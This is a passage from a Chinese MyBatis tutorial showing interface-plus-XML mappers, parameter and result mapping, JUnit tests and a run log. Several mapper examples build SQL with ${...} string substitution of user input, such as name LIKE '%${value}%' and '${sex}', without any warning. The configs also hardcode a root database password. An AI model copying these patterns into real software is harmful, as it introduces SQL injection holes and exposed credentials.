View Code
三、使用接口+XML实现完整数据访问
上一章中使用XML作为映射器与使用接口加注解的形式分别实现了完整的数据访问，可以点击《MyBatis学习总结（一）——ORM概要与MyBatis快速起步》查看，这里综合两种方式实现数据访问，各取所长，配置灵活，在代码中不需要引用很长的id名称，面向接口编程，示例如下：
3.1、在IDEA中创建一个Maven项目
创建成功的目录结构如下：

3.2、添加依赖
pom.xml文件如下：

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.zhangguo.mybatis03</groupId>
    <artifactId>MyBatis03</artifactId>
    <version>1.0-SNAPSHOT</version>
    
    <dependencies>
        <!--MyBatis -->
        <dependency>
            <groupId>org.mybatis</groupId>
            <artifactId>mybatis</artifactId>
            <version>3.4.6</version>
        </dependency>
        <!--MySql数据库驱动 -->
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.38</version>
        </dependency>
        <!-- JUnit单元测试工具 -->
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.11</version>
            <scope>test</scope>
        </dependency>
    </dependencies>

</project>

添加成功效果如下：

3.3、创建POJO类
学生POJO类如下：

package com.zhangguo.mybatis03.entities;

/**
 * 学生实体
 */
public class Student {
    private int id;
    private String name;
    private String sex;

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getSex() {
        return sex;
    }

    public void setSex(String sex) {
        this.sex = sex;
    }

    @Override
    public String toString() {
        return "Student{" +
                "id=" + id +
                ", name='" + name + '\'' +
                ", sex='" + sex + '\'' +
                '}';
    }
}

3.4、创建数据访问接口
StudentMapper.java：

package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Student;

import java.util.List;

public interface StudentMapper {
    /**
     * 根据学生编号获得学生对象
     */
    Student selectStudentById(int id);

    /**
     * 根据学生姓名获得学生集合
     */
    List<Student> selectStudentsByName(String name);

    /**
     * 添加学生
     */
    int insertStudent(Student entity);

    /**
     * 更新学生
     */
    int updateStudent(Student entity);

    /**
     * 删除学生
     */
    int deleteStudent(int id);
}

3.5、根据接口编写XML映射器
要求方法名与Id同名，包名与namespace同名。
在src/main/resources/mapper目录下创建studentMapper.xml文件，内容如下：

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.zhangguo.mybatis03.dao.StudentMapper">
    <select id="selectStudentById" resultType="Student">
        SELECT id,name,sex from student where id=#{id}
    </select>

    <select id="selectStudentsByName" parameterType="String" resultType="student">
        SELECT id,name,sex from student where name like '%${value}%';
    </select>

    <insert id="insertStudent" parameterType="student">
        insert into student(name,sex) VALUES(#{name},'${sex}')
    </insert>

    <update id="updateStudent" parameterType="student">
        update student set name=#{name},sex=#{sex} where id=#{id}
    </update>

    <delete id="deleteStudent" parameterType="int">
        delete from student where id=#{id}
    </delete>

</mapper>

3.6、添加MyBatis核心配置文件
在src/main/resources目录下创建两个配置文件。
mybatisCfg.xml文件如下：

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE configuration
        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<configuration>
    <!--导入db.properties文件中的所有key-value数据-->
    <!--外部引入的内容将覆盖内部定义的-->
    <properties resource="db.properties">
        <!--定义一个名称为driver，值为com.mysql.jdbc.Driver的属性-->
        <property name="mysql.driver" value="com.mysql.jdbc.Driver"></property>
    </properties>

    <settings>
        <!--设置是否允许缓存-->
        <setting name="cacheEnabled" value="true"/>
        <!--设置日志输出的目标-->
        <setting name="logImpl" value="STDOUT_LOGGING"/>
    </settings>

    <!--别名-->
    <typeAliases>
        <!--定义单个别名，指定名称为student，对应的类型为com.zhangguo.mybatis02.entities.Student-->
        <!--<typeAlias type="com.zhangguo.mybatis02.entities.Student" alias="student"></typeAlias>-->
        <!--指定包名下所有的类被自动扫描并定义默认别名，
        mybatis会自动扫描包中的pojo类，自动定义别名，别名就是类名(首字母大写或小写都可以)-->
        <package name="com.zhangguo.mybatis03.entities"></package>
    </typeAliases>

    <!--注册自定义的类型处理器-->
    <typeHandlers>
        <!--<typeHandler handler="" javaType="" jdbcType=""></typeHandler>-->
    </typeHandlers>

    <!--环境配置，default为默认选择的环境-->
    <environments default="development">
        <!--开发-->
        <environment id="development">
            <!--事务管理-->
            <transactionManager type="JDBC"/>
            <!--连接池-->
            <dataSource type="POOLED">
                <!--引用属性${mysql.driver}-->
                <property name="driver" value="${mysql.driver}"/>
                <property name="url" value="${mysql.url}"/>
                <property name="username" value="${mysql.username}"/>
                <property name="password" value="${mysql.password}"/>
            </dataSource>
        </environment>
        <!--运行-->
        <environment id="work">
            <transactionManager type="JDBC"/>
            <dataSource type="POOLED">
                <property name="driver" value="${driver}"/>
                <property name="url" value="jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&amp;characterEncoding=UTF-8"/>
                <property name="username" value="root"/>
                <property name="password" value="uchr@123"/>
            </dataSource>
        </environment>
    </environments>

    <mappers>
        <!--根据路径注册一个基于XML的映射器-->
        <mapper resource="mapper/studentMapper.xml"/>
    </mappers>

</configuration>

db.properties文件内容如下：

##MySQL连接字符串
#驱动
mysql.driver=com.mysql.jdbc.Driver
#地址
mysql.url=jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&characterEncoding=UTF-8
#用户名
mysql.username=root
#密码
mysql.password=uchr@123

3.7、编写MyBatis通用的工具类
 SqlSessionFactoryUtil.java内容如下：

package com.zhangguo.mybatis03.utils;

import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.apache.ibatis.session.SqlSessionFactoryBuilder;

import java.io.IOException;
import java.io.InputStream;

/**
 * MyBatis 会话工具类
 * */
public class SqlSessionFactoryUtil {

    /**
     * 获得会话工厂
     *
     * */
    public static SqlSessionFactory getFactory(){
        InputStream inputStream = null;
        SqlSessionFactory sqlSessionFactory=null;
        try{
            //加载mybatisCfg.xml配置文件，转换成输入流
            inputStream = SqlSessionFactoryUtil.class.getClassLoader().getResourceAsStream("mybatisCfg.xml");

            //根据配置文件的输入流构造一个SQL会话工厂
            sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
        }
        finally {
            if(inputStream!=null){
                try {
                    inputStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return sqlSessionFactory;
    }

    /**
     * 获得sql会话，是否自动提交
     * */
    public static SqlSession openSession(boolean isAutoCommit){
        return getFactory().openSession(isAutoCommit);
    }

    /**
     * 关闭会话
     * */
    public static void closeSession(SqlSession session){
        if(session!=null){
            session.close();
        }
    }

}

3.8、通过MyBatis实现数据访问
StudentDao.java内容如下：

package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Student;
import com.zhangguo.mybatis03.utils.SqlSessionFactoryUtil;
import org.apache.ibatis.session.SqlSession;

import java.util.List;

public class StudentDao implements StudentMapper {

    /**
     * 根据学生编号获得学生对象
     */
    public Student selectStudentById(int id) {
        Student entity = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper=session.getMapper(StudentMapper.class);

        //查询单个对象，指定参数为3
        entity = mapper.selectStudentById(id);

        //关闭
        SqlSessionFactoryUtil.closeSession(session);

        return entity;
    }


    /**
     * 根据学生姓名获得学生集合
     */
    public List<Student> selectStudentsByName(String name) {
        List<Student> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper=session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities =mapper.selectStudentsByName(name);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }


    /**
     * 添加学生
     */
    public int insertStudent(Student entity) {
        //影响行数
        int rows=0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper=session.getMapper(StudentMapper.class);

        //执行添加
        rows = mapper.insertStudent(entity);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

    /**
     * 更新学生
     */
    public int updateStudent(Student entity) {
        //影响行数
        int rows=0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper=session.getMapper(StudentMapper.class);

        //执行更新
        rows =mapper.updateStudent(entity);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

    /**
     * 删除学生
     */
    public int deleteStudent(int id) {
        //影响行数
        int rows=0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper=session.getMapper(StudentMapper.class);

        //执行删除
        rows = mapper.deleteStudent(id);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

}

最后完成的项目结构：

3.9、测试用例
在测试类上添加注解@FixMethodOrder(MethodSorters.JVM)的目的是指定测试方法按定义的顺序执行。
StudentDaoTest.java如下所示： 


package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Student;
import org.junit.*;
import org.junit.runners.MethodSorters;

import java.util.List;

/**
 * StudentDao Tester.
 *
 * @author <Authors name>
 * @version 1.0
 * @since <pre>09/26/2018</pre>
 */
@FixMethodOrder(MethodSorters.JVM)//指定测试方法按定义的顺序执行
public class StudentDaoTest {
    StudentMapper dao;
    @Before
    public void before() throws Exception {
        dao=new StudentDao();
    }

    @After
    public void after() throws Exception {
    }

    /**
     * Method: selectStudentById(int id)
     */
    @Test
    public void testSelectStudentById() throws Exception {
        Student entity=dao.selectStudentById(1);
        System.out.println(entity);
        Assert.assertNotNull(entity);
    }

    /**
     * Method: selectStudentsByName(String name)
     */
    @Test
    public void testSelectStudentsByName() throws Exception {
        List<Student> students=dao.selectStudentsByName("C");
        System.out.println(students);
        Assert.assertNotNull(students);
    }

    /**
     * Method: insertStudent
     */
    @Test
    public void testInsertStudent() throws Exception {
        Student entity=new Student();
        entity.setName("张大");
        entity.setSex("boy");

        Assert.assertEquals(1,dao.insertStudent(entity));
    }

    /**
     * Method: updateStudent
     */
    @Test
    public void testUpdateStudent() throws Exception {
        Student entity=dao.selectStudentById(11);
        entity.setName("张丽美");
        entity.setSex("girl");

        Assert.assertEquals(1,dao.updateStudent(entity));
    }

    /**
     * Method: deleteStudent
     */
    @Test
    public void testDeleteStudent() throws Exception {
        Assert.assertEquals(1,dao.deleteStudent(12));
    }
} 

View Code
3.10、测试结果
测试前的数据库：

测试结果：

日志：


"C:\Program Files\Java\jdk1.8.0_111\bin\java" -ea -Didea.test.cyclic.buffer.size=1048576 "-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2017.2.1\lib\idea_rt.jar=2783:C:\Program Files\JetBrains\IntelliJ IDEA 2017.2.1\bin" -Dfile.encoding=UTF-8 -classpath "C:\Program Files\JetBrains\IntelliJ IDEA 2017.2.1\lib\idea_rt.jar;C:\Program Files\JetBrains\IntelliJ IDEA 2017.2.1\plugins\junit\lib\junit-rt.jar;C:\Program Files\JetBrains\IntelliJ IDEA 2017.2.1\plugins\junit\lib\junit5-rt.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\deploy.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\access-bridge-64.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\cldrdata.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\dnsns.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\jaccess.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\jfxrt.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\localedata.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\nashorn.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\sunec.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\sunjce_provider.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\sunmscapi.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\sunpkcs11.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\ext\zipfs.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\javaws.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\jfxswt.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\management-agent.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\plugin.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_111\jre\lib\rt.jar;D:\Documents\Downloads\Compressed\MyBatis03\target\test-classes;D:\Documents\Downloads\Compressed\MyBatis03\target\classes;C:\Users\Administrator\.m2\repository\org\mybatis\mybatis\3.4.6\mybatis-3.4.6.jar;C:\Users\Administrator\.m2\repository\mysql\mysql-connector-java\5.1.38\mysql-connector-java-5.1.38.jar;C:\Users\Administrator\.m2\repository\junit\junit\4.11\junit-4.11.jar;C:\Users\Administrator\.m2\repository\org\hamcrest\hamcrest-core\1.3\hamcrest-core-1.3.jar" com.intellij.rt.execution.junit.JUnitStarter -ideVersion5 -junit4 com.zhangguo.mybatis03.dao.StudentDaoTest
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 662822946.
==>  Preparing: delete from student where id=? 
==> Parameters: 12(Integer)
<==    Updates: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@2781e022]
Returned connection 662822946 to pool.
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 1045941616.
==>  Preparing: SELECT id,name,sex from student where id=? 
==> Parameters: 11(Integer)
<==    Columns: id, name, sex
<==        Row: 11, lili, secret
<==      Total: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@3e57cd70]
Returned connection 1045941616 to pool.
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 1540270363.
==>  Preparing: update student set name=?,sex=? where id=? 
==> Parameters: 张丽美(String), girl(String), 11(Integer)
<==    Updates: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@5bcea91b]
Returned connection 1540270363 to pool.
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 681384962.
==>  Preparing: insert into student(name,sex) VALUES(?,'boy') 
==> Parameters: 张大(String)
<==    Updates: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@289d1c02]
Returned connection 681384962 to pool.
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 428910174.
==>  Preparing: SELECT id,name,sex from student where name like '%C%'; 
==> Parameters: 
<==    Columns: id, name, sex
<==        Row: 4, candy, secret
<==      Total: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@1990a65e]
Returned connection 428910174 to pool.
[Student{id=4, name='candy', sex='secret'}]
Logging initialized using 'class org.apache.ibatis.logging.stdout.StdOutImpl' adapter.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
PooledDataSource forcefully closed/removed all connections.
Opening JDBC Connection
Created connection 1134612201.
==>  Preparing: SELECT id,name,sex from student where id=? 
==> Parameters: 1(Integer)
<==    Columns: id, name, sex
<==        Row: 1, rose, girl
<==      Total: 1
Closing JDBC Connection [com.mysql.jdbc.JDBC4Connection@43a0cee9]
Returned connection 1134612201 to pool.
Student{id=1, name='rose', sex='girl'}

Process finished with exit code 0

View Code
测试后的数据库：
 
四、MyBatis输入输出映射
4.1、输入映射
通过parameterType指定输入参数的类型，类型可以是简单类型、HashMap、POJO的包装类型。
Mybatis的配置文件中的select,insert,update,delete有一个属性parameter来接收mapper接口方法中的参数。可以接收的类型有简单类型和复杂类型，但是只能是一个参数。这个属性是可选的，因为Mybatis可以通过TypeHandler来判断传入的参数类型，默认值是unset。
4.1.1、基本类型
各种java的基本数据类型。常用的有int、String、Data等
接口：

    /**
     * 根据学生编号获得学生对象
     */
    Student selectStudentById(int id);

映射：

    <select id="selectStudentById" resultType="Student" parameterType="int">
        SELECT id,name,sex from student where id=#{id}
    </select>

测试：

    /**
     * Method: selectStudentById(int id)
     */
    @Test
    public void testSelectStudentById() throws Exception {
        Student entity=dao.selectStudentById(1);
        System.out.println(entity);
        Assert.assertNotNull(entity);
    }

结果：

用#{变量名}来取值，这里的变量名是任意的，可以用value或者是其它的什么值，这里用id是为了便于理解，并不存在什么对应关系的。因为java反射主只能够得到方法参数的类型，而无从知道参数的名字的。当在动态sql中的if语句中的test传递参数时，就必须要用_parameter来传递参数了（OGNL表达式），如果你传入id就会报错。
4.1.2、多个参数
（一）、旧版本MyBatis使用索引号：

<select id="selectStudentsByNameOrSex" resultType="student">
    SELECT id,name,sex from student where name='%${0}%' or sex=#{1};
</select>

由于是多参数那么就不能使用parameterType， 改用#｛index｝是第几个就用第几个的索引，索引从0开始

注意：
如果出现错误：Parameter '0' not found. Available parameters are [arg1, arg0, param1, param2]，请使用#{arg0}或#{param1}
注意：在MyBatis3.4.4版以后不能直接使用#{0}要使用 #{arg0}

（二）、新版本MyBatis使用索引号：
接口：

    /**
     * 根据学生姓名或性别获得学生集合
     */
    List<Student> selectStudentsByNameOrSex(String name,String sex);

映射：

<select id="selectStudentsByNameOrSex" resultType="student">
    SELECT id,name,sex from student where name like '%${arg0}%' or sex=#{param2};
</select>

方法一：arg0,arg1,arg2...
方法二：param1,param2,param3...

测试：

    /**
     * Method: selectStudentsByNameOrSex(String name, String sex)
     */
    @Test
    public void selectStudentsByNameOrSex() throws Exception {
        List<Student> students=dao.selectStudentsByNameOrSex("Candy","boy");
        System.out.println(students);
        Assert.assertNotNull(students);
    }

结果：

（三）、使用Map
接口：

    /**
     * 根据学生姓名或性别获得学生集合
     */
    List<Student> selectStudentsByNameOrSex(Map<String,Object> params);

映射：

    <select id="selectStudentsByNameOrSex" resultType="student">
        SELECT id,name,sex from student where name like '%${name}%' or sex=#{sex};
    </select>

测试：

    /**
     * Method: List<Student> selectStudentsByNameOrSex(Map<String,Object> params);
     */
    @Test
    public void selectStudentsByNameOrSex() throws Exception {
        Map<String,Object> params=new HashMap<String,Object>();
        params.put("name","Candy");
        params.put("sex","girl");
        List<Student> students=dao.selectStudentsByNameOrSex(params);

        System.out.println(students);
        Assert.assertNotNull(students);
    }

结果：

（四）、注解参数名称：
接口：

    /**
     * 根据学生姓名或性别获得学生集合
     */
    List<Student> selectStudentsByNameOrSex(@Param("realname") String name,@Param("sex") String sex);

映射：

    <select id="selectStudentsByNameOrSex" resultType="student">
        SELECT id,name,sex from student where name like '%${realname}%' or sex=#{sex};
    </select>

测试：

    /**
     * Method: selectStudentsByNameOrSex(String name,String sex)
     */
    @Test
    public void testSelectStudentsByNameOrSex() throws Exception {
        List<Student> students=dao.selectStudentsByNameOrSex("C","boy");
        System.out.println(students);
        Assert.assertNotNull(students);
    }

结果：

4.1.3、POJO对象
各种类型的POJO，取值用#{属性名}。这里的属性名是和传入的POJO中的属性名一一对应。
接口：

    /**
     * 添加学生
     */
    int insertStudent(Student entity);

映射：

    <insert id="insertStudent" parameterType="student">
        insert into student(name,sex) VALUES(#{name},'${sex}')
    </insert>

测试：

    /**
     * Method: insertStudent
     */
    @Test
    public void testInsertStudent() throws Exception {
        Student entity=new Student();
        entity.setName("张明");
        entity.setSex("boy");

        Assert.assertEquals(1,dao.insertStudent(entity));
    }

结果：

如果要在if元素中测试传入的user参数,仍然要使用_parameter来引用传递进来的实际参数,因为传递进来的User对象的名字是不可考的。如果测试对象的属性,则直接引用属性名字就可以了。测试user对象:

<if test="_parameter!= null">

测试user对象的属性:

<if test="name!= null">

如果对象中还存在对象则需要使用${属性名.属性.x}方式访问
4.1.4、Map
具体请查看4.1.2节。
传入map类型,直接通过#{keyname}就可以引用到键对应的值。使用@param注释的多个参数值也会组装成一个map数据结构,和直接传递map进来没有区别。
mapper接口:

int updateByExample(@Param("user") User user, @Param("example") UserExample example);

sql映射:

<update id="updateByExample" parameterType="map" > 

update tb_user set id = #{user.id}, ... 

<if test="_parameter != null" > 

<include refid="Update_By_Example_Where_Clause" />

</if>

</update>

注意这里测试传递进来的map是否为空,仍然使用_parameter
4.1.5、集合类型
可以传递一个List或Array类型的对象作为参数,MyBatis会自动的将List或Array对象包装到一个Map对象中,List类型对象会使用list作为键名,而Array对象会用array作为键名。集合类型通常用于构造IN条件，sql映射文件中使用foreach元素来遍历List或Array元素。
假定这里需要实现多删除功能，示例如下：
接口：

    /**
     * 删除多个学生通过编号
     */
    int deleteStudents(List<Integer> ids);

映射：

    <delete id="deleteStudents">
        delete from student where id in
        <foreach collection="list" item="id" open="(" separator="," close=")">
            #{id}
        </foreach>
    </delete>

collection这里只能是list
测试：

    /**
     * Method: deleteStudents
     */
    @Test
    public void testDeleteStudents() throws Exception {
        List<Integer> ids=new ArrayList<Integer>();
        ids.add(10);
        ids.add(11);
        Assert.assertEquals(2,dao.deleteStudents(ids));
    }

结果：

当然查询中也可以这样使用

public List<XXXBean> getXXXBeanList(List<String> list);  

<select id="getXXXBeanList" resultType="XXBean">
　　select 字段... from XXX where id in
　　<foreach item="item" index="index" collection="list" open="(" separator="," close=")">  
　　　　#{item}  
　　</foreach>  
</select>  

foreach 最后的效果是select 字段... from XXX where id in ('1','2','3','4') 

对于单独传递的List或Array,在SQL映射文件中映射时,只能通过list或array来引用。但是如果对象类型有属性的类型为List或Array，则在sql映射文件的foreach元素中,可以直接使用属性名字来引用。mapper接口: 

List<User> selectByExample(UserExample example);

sql映射文件: 

<where>
<foreach collection="oredCriteria" item="criteria" separator="or">
<if test="criteria.valid">
</where>

在这里,UserExample有一个属性叫oredCriteria,其类型为List,所以在foreach元素里直接用属性名oredCriteria引用这个List即可。
item="criteria"表示使用criteria这个名字引用每一个集合中的每一个List或Array元素。
4.2、输出映射
输出映射主要有两种方式指定ResultType或ResultMap，现在分别介绍一下：
4.2.1、ResultType
使用ResultType进行输出映射，只有查询出来的列名和pojo中的属性名一致，该列才可以映射成功。
如果查询出来的列名和POJO中的属性名全部不一致，没有创建POJO对象。
只要查询出来的列名和POJO中的属性有一个一致，就会创建POJO对象。

（一）、输出简单类型
接口：

    /**
     * 获得学生总数
     * */
    long selectStudentsCount();

映射：

    <select id="selectStudentsCount" resultType="long">
        SELECT count(*) from student
    </select>

测试：

    /**
     * Method: selectStudentsCount()
     */
    @Test
    public void testSelectStudentsCount() throws Exception {
        Assert.assertNotEquals(0,dao.selectStudentsCount());
    }

结果：

查询出来的结果集只有一行一列，可以使用简单类型进行输出映射。
(二）、输出POJO对象和POJO列表 
不管是输出的POJO单个对象还是一个列表（List中存放POJO），在mapper.xml中ResultType指定的类型是一样的，但方法返回值类型不一样。
输出单个POJO对象，方法返回值是单个对象类型
接口：

    /**
     * 根据学生编号获得学生对象
     */
    Student selectStudentById(int id);

映射：

    <select id="selectStudentById" resultType="Student">
        SELECT id,name,sex from student where id=#{id}
    </select>

输出pojo对象list，方法返回值是List<POJO>
接口：

    /**
     * 根据学生姓名获得学生集合
     */
    List<Student> selectStudentsByName(String name);

映射：

    <select id="selectStudentsByName" parameterType="String" resultType="student">
        SELECT id,name,sex from student where name like '%${value}%';
    </select>

生成的动态代理对象中是根据mapper.java方法的返回值类型确定是调用selectOne(返回单个对象调用)还是selectList(返回集合对象调用)
4.2.2、ResultMap
MyBatis中使用ResultMap完成自定义输出结果映射，如一对多，多对多关联关系。
问题：
假定POJO对象与表中的字段不一致，如下所示:

接口：

    /**
     * 根据性别获得学生集合
     */
    List<Stu> selectStudentsBySex(String sex);

映射：

    <select id="selectStudentsBySex" parameterType="String" resultType="stu">
        SELECT id,name,sex from student where sex=#{sex};
    </select>

测试：

    /**
     * Method: selectStudentsBySex(String sex)
     */
    @Test
    public void testSelectStudentsBySex() throws Exception {
        List<Stu> students=dao.selectStudentsBySex("boy");
        System.out.println(students);
        Assert.assertNotNull(students.get(0));
    }

结果：
 
（一）、定义并引用ResultMap
修改映射文件：

    <!--定义结果映射，id是引用时的编号需唯一，stu是最终被映射的类型-->
    <resultMap id="stuMap" type="stu">
        <!--映射结果,collumn表示列名，property表示属性名-->
        <result column="id" property="stu_id"></result>
        <result column="name" property="stu_name"></result>
        <result column="sex" property="stu_sex"></result>
    </resultMap>
    
    <!--resultMap指定引用的映射-->
    <select id="selectStudentsBySex" parameterType="String" resultMap="stuMap">
        SELECT id,name,sex from student where sex=#{sex};
    </select>

测试结果：

（二）、使用别名
 修改映射文件：

    <select id="selectStudentsBySex" parameterType="String" resultType="stu">
      SELECT id stu_id,name stu_name,sex as stu_sex from student where sex=#{sex};
    </select>

测试结果：

4.2.3、返回Map
假定要返回id作为key，name作为value的Map。
接口：

    /**
     * 获得所有学生Map集合
     */
    List<Map<String,Object>> selectAllStudents();

映射：

    <resultMap id="stuKeyValueMap" type="HashMap">
        <result property="name" column="NAME"></result>
        <result property="value" column="VALUE"></result>
    </resultMap>

    <select id="selectAllStudents" resultMap="stuKeyValueMap">
        SELECT id NAME,name VALUE from student;
    </select>

测试：

   /**
     * Method: selectAllStudents()
     */
    @Test
    public void testSelectAllStudents() throws Exception {
        List<Map<String,Object>>  students=dao.selectAllStudents();
        System.out.println(students);
        Assert.assertNotNull(students);
    }

结果：

<resultMap id="pieMap"   type="HashMap">  
    <result property="value" column="VALUE" />  
    <result property="name" column="NAME" />  
</resultMap>

<select id="queryPieParam" parameterType="String" resultMap="pieMap">
    SELECT
    　　PLAT_NAME NAME,
        <if test='_parameter == "总量"'>
            AMOUNT VALUE
        </if>
        <if test='_parameter == "总额"'>
            TOTALS VALUE
        </if>
    FROM
        DOMAIN_PLAT_DEAL_PIE
    ORDER BY
        <if test='_parameter  == "总量"'>
            AMOUNT
        </if>
        <if test='_parameter  == "总额"'>
            TOTALS
        </if>
    ASC
</select>

用resultType进行输出映射，只有查询出来的列名和pojo中的属性名一致，该列才可以映射成功。
如果查询出来的列名和pojo的属性名不一致，通过定义一个resultMap对列名和pojo属性名之间作一个映射关系。
 最终完成的映射器：


<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.zhangguo.mybatis03.dao.StudentMapper">

    <select id="selectStudentById" resultType="Student">
        SELECT id,name,sex from student where id=#{id}
    </select>

    <select id="selectStudentsCount" resultType="long">
        SELECT count(*) from student
    </select>

    <select id="selectStudentsByName" parameterType="String" resultType="student">
        SELECT id,name,sex from student where name like '%${value}%';
    </select>

    <resultMap id="stuKeyValueMap" type="HashMap">
        <result property="name" column="NAME"></result>
        <result property="value" column="VALUE"></result>
    </resultMap>

    <select id="selectAllStudents" resultMap="stuKeyValueMap">
        SELECT id NAME,name VALUE from student;
    </select>


    <!--定义结果映射，id是引用时的编号需唯一，stu是最终被映射的类型-->
    <resultMap id="stuMap" type="stu">
        <!--映射结果,collumn表示列名，property表示属性名-->
        <result column="id" property="stu_id"></result>
        <result column="name" property="stu_name"></result>
        <result column="sex" property="stu_sex"></result>
    </resultMap>

    <!--resultMap指定引用的映射-->
    <!--<select id="selectStudentsBySex" parameterType="String" resultMap="stuMap">-->
        <!--SELECT id,name,sex from student where sex=#{sex};-->
    <!--</select>-->

    <select id="selectStudentsBySex" parameterType="String" resultType="stu">
      SELECT id stu_id,name stu_name,sex as stu_sex from student where sex=#{sex};
    </select>


    <select id="selectStudentsByNameOrSex" resultType="student">
      SELECT id,name,sex from student where name like '%${realname}%' or sex=#{sex};
    </select>

    <select id="selectStudentsByIdOrSex" resultType="student">
        SELECT id,name,sex from student where id=#{no} or sex=#{sex};
    </select>


    <insert id="insertStudent" parameterType="student">
        insert into student(name,sex) VALUES(#{name},'${sex}')
    </insert>

    <update id="updateStudent" parameterType="student">
        update student set name=#{name},sex=#{sex} where id=#{id}
    </update>

    <delete id="deleteStudent" parameterType="int">
